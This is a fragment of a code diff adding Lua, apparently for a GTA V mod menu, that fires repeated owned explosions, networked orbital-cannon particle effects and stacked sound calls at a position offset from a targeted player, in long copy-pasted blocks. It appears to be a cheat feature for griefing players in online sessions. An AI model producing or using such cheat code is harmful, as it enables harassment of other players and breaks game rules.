+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            CAM.SHAKE_CAM(cam, "GAMEPLAY_EXPLOSION_SHAKE", 1.5)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 65.5, 56.0)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
